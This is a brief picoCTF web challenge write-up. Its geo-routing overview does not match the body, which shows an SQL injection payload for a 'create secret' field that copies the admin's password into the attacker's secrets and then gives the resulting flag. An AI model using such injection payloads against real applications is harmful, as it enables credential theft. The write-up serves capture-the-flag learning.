+++
date = '2026-04-20'
draft = false
title = 'Pico Secret Box writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

I've set up geo-based routing - can you outsmart it? You're trying to retrieve the flag, but there's a catch: access to the real service is restricted based on your geographic location. Only requests from a specific region are routed to the server that holds the flag. Everyone else is sent somewhere... less interesting.

## Identifying the vulnerabilities

The create secret is vulnerable to sql injection; Creating a secret with the contents `a'); INSERT INTO secrets(owner_id, content) SELECT '5fba75e8-3444-434d-a353-b9ea93796097', password FROM users WHERE username = 'admin'--` will insert into our secrets the admin's password.

We can log in using it, and we see the admin's password, `picoCTF{sq1_1nject10n_0f72a7ec}`.





